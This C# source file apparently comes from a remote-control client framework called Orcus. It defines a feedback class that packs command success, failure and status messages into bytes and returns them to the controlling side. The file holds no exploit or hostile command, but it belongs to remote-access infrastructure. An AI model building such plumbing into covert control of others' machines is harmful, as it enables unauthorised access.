using System;
using System.Text;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Commands.ClientCommands;

namespace Orcus.Commands.ClientCommands
{
    public class ClientCommandsFeedbackFactory : IFeedbackFactory
    {
        private readonly IConnectionInfo _connectionInfo;
        private readonly Command _command;
        private bool _isFinalized;

        public ClientCommandsFeedbackFactory(IConnectionInfo connectionInfo, Command command)
        {
            _connectionInfo = connectionInfo;
            _command = command;
        }

        public void Succeeded()
        {
            ResponseResult(true, null);
        }

        public void Failed()
        {
            ResponseResult(false, null);
        }

        public void Succeeded(string message)
        {
            ResponseResult(true, message);
        }

        public void Failed(string message)
        {
            ResponseResult(false, message);
        }

        public void SendMessage(string message, MessageType messageType)
        {
            if (_isFinalized)
                return;

            var messageData = Encoding.UTF8.GetBytes(message);
            var data = new byte[messageData.Length + 2];
            data[0] = (byte) ClientCommandsCommunication.ResponseCommandMessage;
            data[1] = (byte) messageType;
            Array.Copy(messageData, 0, data, 2, messageData.Length);
            _connectionInfo.CommandResponse(_command, data);
        }

        private void ResponseResult(bool succeeded, string message)
        {
            if (_isFinalized)
                return;

            _isFinalized = true;

            byte[] messageData = null;
            if (message != null)
                messageData = Encoding.UTF8.GetBytes(message);

            var data = new byte[1 + (messageData?.Length ?? 0)];
            data[0] =
                (byte)
                    (succeeded
                        ? ClientCommandsCommunication.ResponseCommandSucceeded
                        : ClientCommandsCommunication.ResponseCommandFailed);
            if (messageData != null)
                Array.Copy(messageData, 0, data, 1, messageData.Length);

            _connectionInfo.CommandResponse(_command, data);
        }
    }
}